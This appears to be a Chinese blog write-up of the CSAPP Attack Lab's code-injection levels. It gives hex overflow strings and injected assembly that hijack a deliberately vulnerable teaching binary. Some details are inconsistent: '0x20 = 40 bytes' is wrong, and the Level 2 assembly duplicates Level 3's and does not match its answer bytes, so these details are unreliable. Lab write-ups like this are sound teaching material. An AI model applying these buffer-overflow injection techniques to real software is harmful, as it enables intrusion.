---
title: 'CSAPP_AttackLab'
date: 2023-03-01
permalink: /posts/2023/03/csapp_attacklab/
tags:
  - labs
  - solutions
excerpt: ""
---

代码参考: [https://github.com/ChenYuHengSJTU/CSAPP_Labs/tree/main/target1](https://github.com/ChenYuHengSJTU/CSAPP_Labs/tree/main/target1)

## 一些准备工作

+ 实验 Writeup 的附录中有很多有用的东西，包括书写简单的汇编代码，将汇编编译为字节码，然后在反汇编得到汇编指令的字节表示。
+ 使用 `objdump -d ctarget > ctarget.txt` 将 ctarget 反汇编

## Part I: Code Injection Attacks

### Level 1

+ 根据 writeup 的提示，需要利用 getbuf 中字符数组无边界检查的特性，将 touch1 的地址塞进栈中，让 getbuf 从栈中弹出地址时，弹出的是 touch1 的地址

+ 上汇编代码

![assets\post\2023-03\image-20230301200029288.png](/assets\post\2023-03\image-20230301200029288.png)

+ 可以得到 touch1 地址：0x4017c0

+ 由汇编代码，getbuf 将读入的字符串存放在栈中，预设的字符串最大长度为 0x20 = 40 bytes！！！

+ 所以我们需要输入至少长度为 48bytes 的字符串，其中，41 - 48 的子串为 touch1 的地址

+ 得到答案：

![assets\post\2023-03\image-20230301200620547.png](/assets\post\2023-03\image-20230301200620547.png)

### Level 2

+ 需要跳转到 touch2，并且需要正确传递 cookie 为参数

+ 根据 x86 的函数调用规则，应该把 cookie 传给 rdi

+ 所以需要自己插入一些代码

+ 思路就是，让 buf 溢出，将返回地址设置为自己插入的代码的地址，在自己的代码中进行参数传递，然后再跳转到 touch2

+ 汇编代码

```assembly
mov $0x5561dcbc, %rdi
pushq $0x4018fa
retq
```

+ `gcc -c *.s -o *.0 objdump -d *.o > *.d`

```assembly
level3.o：     文件格式 elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 bc dc 61 55 	mov    $0x5561dcbc,%rdi
   7:	68 fa 18 40 00       	pushq  $0x4018fa
   c:	c3                   	retq   
```

+ 注意，需要考虑插入的字节序列的方向，其实在这里就从头往后依次插入就可以了，不需要调整方向

+ One possible solution：

```text
10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 a8 dc 61 55 00 00 00 00 48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 
```

![assets\post\2023-03\image-20230301200735291.png](/assets\post\2023-03\image-20230301200735291.png)

### Level3

+ 同样需要传递参数，只不过这次传递的是一个字符串，所以还需要考虑把字符串放在内存的哪个位置

+ 其实可以放在 buf 溢出的位置（我这里一次就成功了，不过看网上的其他答案，好像这个字符串必须放在内存位置较高的地方，否则有可能被 touch3 里面的函数调用覆盖，我直接放在了 buf + 8 + injected code length 的位置

+ 汇编代码：

```assembly
mov $0x5561dcbc, %rdi
pushq $0x4018fa
retq
```

反汇编后：

```assembly
level3.o：     文件格式 elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 bc dc 61 55 	mov    $0x5561dcbc,%rdi
   7:	68 fa 18 40 00       	pushq  $0x4018fa
   c:	c3                   	retq   
```

+ One possible solution：

```text
35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 a8 dc 61 55 00 00 00 00 48 c7 c7 b6 dc 61 55 68 fa 18 40 00 c3 00 35 39 62 39 39 37 66 61 00
```

![assets\post\2023-03\image-20230305134834990.png](/assets\post\2023-03\image-20230305134834990.png)